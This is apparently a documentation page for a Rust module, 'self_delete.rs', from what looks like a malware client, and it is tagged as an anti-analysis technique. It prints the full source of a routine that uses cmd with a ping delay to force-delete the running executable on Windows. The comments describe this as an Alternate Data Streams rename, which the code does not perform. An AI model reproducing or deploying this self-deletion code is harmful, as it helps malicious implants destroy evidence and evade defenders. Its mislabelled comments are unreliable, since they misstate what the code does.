# self_delete

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/self_delete.rs` |
| **Lines** | 24 |
| **Cards** | T013-anti-analysis |
| **Role** | Self-deletion via ADS rename |

## Public API

### `delete_self` (line 5)
```rust
pub fn delete_self()
```

### `delete_self` (line 22)
```rust
pub fn delete_self()
```

## Full Source

```rust
// Self-deletion via Alternate Data Streams (Windows only).
// On non-Windows, this is a no-op stub.

#[cfg(windows)]
pub fn delete_self() {
    use std::env;
    use std::process::Command;

    if let Ok(exe_path) = env::current_exe() {
        let path_str = exe_path.to_string_lossy();
        // Rename to ADS, then delete the parent file
        let _ = Command::new("cmd")
            .args(["/C", &format!(
                "ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
                path_str
            )])
            .spawn();
    }
}

#[cfg(not(windows))]
pub fn delete_self() {
    // No-op on non-Windows
}

```